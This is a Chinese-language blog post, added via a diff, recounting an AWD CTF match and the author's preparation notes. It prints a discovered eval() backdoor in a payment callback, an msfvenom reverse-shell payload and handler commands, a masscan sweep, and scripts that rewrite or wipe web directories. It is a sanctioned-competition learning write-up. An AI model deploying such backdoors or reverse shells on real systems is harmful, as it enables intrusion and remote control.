@@ -1,0 +1,1936 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="iloveflag">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="iloveflag">
+    
+    <meta name="keywords" content="iloveflag,iloveflag-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="打了一场线下市赛,为awd模式，每个队伍两台靶机防守，一台web1是typecho，一台web2是YznCMSV1.0，前期准备是两个防守，一个攻击，当进入比赛时，环境出了问题，我这个攻击选手进不去，加固时间都已经过了，我赶紧连上去以后下载源码，D盾一扫发现几个木马，123456789101112131415161718192021222324c:\users\iloveflag\desktop\">
+<meta property="og:type" content="article">
+<meta property="og:title" content="awd总结">
+<meta property="og:url" content="https://iloveflag.github.io/2020/09/08/awd%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="iloveflag&#39;s Blog">
+<meta property="og:description" content="打了一场线下市赛,为awd模式，每个队伍两台靶机防守，一台web1是typecho，一台web2是YznCMSV1.0，前期准备是两个防守，一个攻击，当进入比赛时，环境出了问题，我这个攻击选手进不去，加固时间都已经过了，我赶紧连上去以后下载源码，D盾一扫发现几个木马，123456789101112131415161718192021222324c:\users\iloveflag\desktop\">
+<meta property="og:locale">
+<meta property="article:published_time" content="2020-09-08T02:43:51.000Z">
+<meta property="article:modified_time" content="2025-02-14T14:45:19.305Z">
+<meta property="article:author" content="iloveflag">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <title>awd总结 · iloveflag&#39;s Blog</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/avatar/avatar.jpg" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="iloveflag's Blog" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<!-- hexo-inject:begin --><!-- hexo-inject:end --><header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >iloveflag-blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">awd总结</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>iloveflag-blog</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            awd总结
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">2.6k</span>阅读时长: <span class="post-count reading-time">12 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/09/08</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>打了一场线下市赛,为awd模式，每个队伍两台靶机防守，一台web1是typecho，一台web2是YznCMSV1.0，前期准备是两个防守，一个攻击，当进入比赛时，环境出了问题，我这个攻击选手进不去，加固时间都已经过了，我赶紧连上去以后下载源码，D盾一扫发现几个木马，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">c:\users\iloveflag\desktop\<span class="number">172.20</span>.<span class="number">131.102</span>\application\pay\controller\api.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">alipay_callback</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$param</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">request</span>(<span class="string">&#x27;param&#x27;</span>);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$param</span>);</span><br><span class="line"></span><br><span class="line">c:\users\iloveflag\desktop\<span class="number">172.20</span>.<span class="number">131.102</span>\application\pay\library\service.php</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="variable">$pay</span> = <span class="title class_">Pay</span>::<span class="variable">$type</span>(<span class="built_in">self</span>::<span class="title function_ invoke__">getConfig</span>(<span class="variable">$type</span>));</span><br><span class="line">            <span class="variable">$get</span> = <span class="title function_ invoke__">request</span>()-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;&#x27;</span>, <span class="literal">null</span>, <span class="string">&#x27;trim&#x27;</span>);</span><br><span class="line">            <span class="comment">//去除空值</span></span><br><span class="line">            <span class="variable">$get</span> = <span class="title function_ invoke__">array_filter</span>(<span class="variable">$get</span>, <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$v&#x27;</span>, <span class="string">&#x27;return !empty($v);&#x27;</span>));</span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$type</span> == <span class="string">&#x27;wechat&#x27;</span> ? <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>) : <span class="variable">$get</span>;</span><br><span class="line">            <span class="variable">$data</span> = <span class="variable">$pay</span>-&gt;<span class="title function_ invoke__">verify</span>(<span class="variable">$data</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$data</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$pay</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>然后删除，后面我看其他队伍都上了waf，我们也上了awd-watchbird-master这款waf，web2上了waf后直接主页上不去了，web1前期没有发现漏洞，只能先上waf扛着，暂时页面正常，我一发现web2down掉以后，直接删除了web目录，开始还原，但是页面可以访问，但是主页直接不行了，后面一直checkdown裁判一直扣分，赛后和其他队伍交流后说还原无效的，web2有个小bug，要自己修日志文件？我木掉了。反正web2已经checkdown了，索性上了waf，防止其他队伍找到bug拿flag，然后转向web1，到了下午的时候，发现队伍一直扣flag分，怀疑web1被下了不死马，因为前期web1上过waf，日志发现有个队伍从index.php/api/alipay_callback连接入侵，但是我一开始以为alipay是web2的漏洞，对手在全局扫描，后面看到不死马发现不对，但是全局搜索alipay没有发现这个api，只能删除了整个web目录，然后还原，发现对方又在public，目录下了一个.blue3.php的不死马，我只能再次还原，然后新建一个.blue3.php的文件，权限111,后面发现一个skyexp.php，对方一直在和我纠缠，而且通过日志知道对方将web权限维持到了他的8080端口，linux服务器这边w发现他一直在，但是可恶的是我这边不是root权限，是ctf用户，也重启不了nginx，kill也踢不出对方www-data用户的权限维持，这就造成比赛体验极差，而且对方拿flag也就算了，直接将index目录下php文件全部删除，只有几个目录，我只能让另外的队友一直还原了，后面想到可以先给自己下马，web端进去就是www-data权限了，随后pkill -kill -t pts/0 踢用户，后续就是和对方不断地比手速，对方还从.1的ip换到.2的ip，不知道是不是两个队友一起上了，直到比赛结束，看了一下其他队伍web1也都是被这个队伍搞了，web1服务器直接挂了，web2一样页面访问错误checkdown扣分，后面一个队伍就是准备了几个靠谱的waf，没有扣分，排名也很靠前，第一次打awd。只能说前期准备不足，本人自己是去攻击的，到了现场全程在运维防守，队友web1上午也一直连接不上~前期准备的防火墙，改mysql之类的都没用上</p>
+<p>前期的准备文档(其实没有什么软子用):<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">加waf:</span><br><span class="line">find /var/www/html -name &quot;*.php&quot;|xargs sed -i &quot;s#&lt;?php#&lt;?php\ninclude_once(&#x27;/var/www/html/log.php&#x27;);\n#g&quot;</span><br><span class="line">防火墙配置</span><br><span class="line"></span><br><span class="line">linux:</span><br><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.1.102 lport=8080  -f elf -o shell</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler </span><br><span class="line">set payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"></span><br><span class="line">防火墙:</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示当前开放的服务</span></span><br><span class="line">[root@192 ~]# firewall-cmd --list-services</span><br><span class="line">dhcpv6-client http https mysql ssh</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">firewall-cmd --add-service=mysql        # 开放mysql端口</span><br><span class="line">firewall-cmd --remove-service=http      # 阻止http端口</span><br><span class="line">firewall-cmd --list-services            # 查看开放的服务</span><br><span class="line">firewall-cmd --add-port=3306/tcp        # 开放通过tcp访问3306</span><br><span class="line">firewall-cmd --remove-port=80tcp        # 阻止通过tcp访问3306</span><br><span class="line">firewall-cmd --add-port=233/udp         # 开放通过udp访问233</span><br><span class="line">firewall-cmd --list-ports               # 查看开放的端口</span><br><span class="line"></span><br><span class="line">mysql禁止远程登录:</span><br><span class="line">防火墙设置:firewall-cmd --remove-service=mysql</span><br><span class="line">mysql数据库层面:</span><br><span class="line">允许远程登录:</span><br><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27; WITH GRANT OPTION;</span><br><span class="line">FLUSH PRIVILEGES;</span><br><span class="line">删除:</span><br><span class="line">mysql_secure_installation</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHPCMS V9 \phpcms\base.php</span><br><span class="line">PHPWIND8.7 \data\sql_config.php</span><br><span class="line">DEDECMS5.7 \data\common.inc.php</span><br><span class="line">DiscuzX2 \config\config_global.php</span><br><span class="line">Wordpress \wp-config.php</span><br><span class="line">Metinfo \include\head.php</span><br><span class="line"></span><br><span class="line">删除不死马:</span><br><span class="line">ps aux | grep www-data | awk &#x27;&#123;print $2&#125;&#x27; | xargs kill -9</span><br></pre></td></tr></table></figure></p>
+<p>awd简介与分工﴾全部要做﴿<br>服务器ssh等密码统一改为nbccserver95，webshell密码为<br>nbccshell95,mysql密码nbccmysql95<br>三人一组，两个攻击，一个防守<br>前期准备（30分钟）<br>将源码打包<br>tar ‐cvf html.tar ./<br>监听还原脚本‐&gt;5分钟还原一次<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">@File    :   awd.py</span></span><br><span class="line"><span class="string">@Time    :   2020/08/09 20:44:54</span></span><br><span class="line"><span class="string">@Author  :   iloveflag </span></span><br><span class="line"><span class="string">@Version :   1.0</span></span><br><span class="line"><span class="string">@Contact :   iloveflag@outlook.com</span></span><br><span class="line"><span class="string">@Desc    :  The Win32 port can only create tar archives,</span></span><br><span class="line"><span class="string">            but cannot pipe its output to other programs such as gzip or compress, </span></span><br><span class="line"><span class="string">            and will not create tar.gz archives; you will have to use or simulate a batch pipe.</span></span><br><span class="line"><span class="string">            BsdTar does have the ability to direcly create and manipulate .tar, .tar.gz, tar.bz2, .zip,</span></span><br><span class="line"><span class="string">            .gz and .bz2 archives, understands the most-used options of GNU Tar, and is also much faster;</span></span><br><span class="line"><span class="string">            for most purposes it is to be preferred to GNU Tar. </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">web_server_command</span>(<span class="params">command,transport</span>): <span class="comment">#对服务器执行命令</span></span><br><span class="line">    ssh = paramiko.SSHClient()</span><br><span class="line">    ssh._transport = transport</span><br><span class="line">    stdin, stdout, stderr = ssh.exec_command(command)</span><br><span class="line">    <span class="comment"># print(stdout.read())</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">web_server_file_action</span>(<span class="params">ip, port, user, passwd, action</span>): <span class="comment">#对服务器文件操作</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        transport = paramiko.Transport(ip, <span class="built_in">int</span>(port))</span><br><span class="line">        transport.connect(username=user, password=passwd)</span><br><span class="line">        sftp = paramiko.SFTP.from_transport(transport)</span><br><span class="line">        remote_path=<span class="string">&#x27;/var/www/html/&#x27;</span></span><br><span class="line">        remote_file = <span class="string">&#x27;html.tar&#x27;</span></span><br><span class="line">        local_path = <span class="string">&#x27;C:/Users/&#x27;</span>+os.getlogin()+<span class="string">&#x27;/Desktop/awd/&#x27;</span>+ip+<span class="string">&#x27;/&#x27;</span></span><br><span class="line">        web_server_command(<span class="string">&#x27;cd &#x27;</span>+remote_path+<span class="string">&#x27; &amp;&amp; tar -cvf &#x27;</span>+remote_file+<span class="string">&#x27; ./&#x27;</span>,transport)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span>(os.path.exists(local_path)):</span><br><span class="line">            os.makedirs(local_path)</span><br><span class="line">        <span class="keyword">if</span> action == <span class="string">&#x27;get&#x27;</span>:</span><br><span class="line">            sftp.get(remote_path+remote_file,local_path+remote_file)</span><br><span class="line">            web_server_command(<span class="string">&#x27;rm -rf &#x27;</span>+remote_path+remote_file,transport)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;服务器源码保存在&#x27;</span>+local_path)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;正在解压:&#x27;</span>)</span><br><span class="line">            os.system(<span class="string">&#x27;cd &#x27;</span>+local_path+<span class="string">&#x27; &amp; tar -xvf &#x27;</span>+remote_file+<span class="string">&#x27; &amp;del &#x27;</span>+remote_file)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;文件解压完成&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            web_server_command(<span class="string">&#x27;rm -rf &#x27;</span>+remote_path+<span class="string">&#x27;*&#x27;</span>,transport)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;清理服务器web目录&#x27;</span>)</span><br><span class="line">            os.system(<span class="string">&#x27;cd &#x27;</span>+local_path+<span class="string">&#x27; &amp; tar -cvf &#x27;</span>+remote_file+<span class="string">&#x27; ./*&#x27;</span>)</span><br><span class="line">            sftp.put(local_path+remote_file, remote_path+remote_file)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;上传成功&#x27;</span>)</span><br><span class="line">            web_server_command(<span class="string">&#x27;cd &#x27;</span>+remote_path+<span class="string">&#x27;&amp;&amp; tar -xvf &#x27;</span>+remote_file+<span class="string">&#x27; &amp;&amp; rm -rf &#x27;</span>+remote_file,transport)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;还原完毕&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;-----------------------------&#x27;</span>)</span><br><span class="line">        sftp.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;download or upload error&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">web_server_mysql_action</span>():</span><br><span class="line">    <span class="comment">#web_server_mysql_action</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">web_server_status</span>():</span><br><span class="line">    <span class="comment">#web_server_status</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    web1_server_ip=<span class="string">&#x27;172.20.131.101&#x27;</span></span><br><span class="line">    web1_server_port=<span class="string">&#x27;22&#x27;</span></span><br><span class="line">    web1_server_user=<span class="string">&#x27;ctf&#x27;</span></span><br><span class="line">    web1_server_passwd=<span class="string">&#x27;nbccserver95&#x27;</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):   	</span><br><span class="line">	    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">	    	time.sleep(<span class="number">1</span>)</span><br><span class="line">	    	<span class="built_in">print</span>(<span class="string">&#x27;倒计时&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;秒&#x27;</span>)</span><br><span class="line">	    web_server_file_action(web1_server_ip,web1_server_port,web1_server_user,web1_server_passwd, <span class="string">&#x27;put&#x27;</span>)</span><br><span class="line">    </span><br></pre></td></tr></table></figure><br>vscode‐&gt;ssh插件，实时在线编辑<br>5台linux服务器，非root用户<br>httpd‐&gt;apache用户<br>nginx‐&gt;wwdata用户<br>攻击:<br>环境<br>至少有一台linux的主机桥接<br>masscan ‐p80,22 192.168.0.1/24 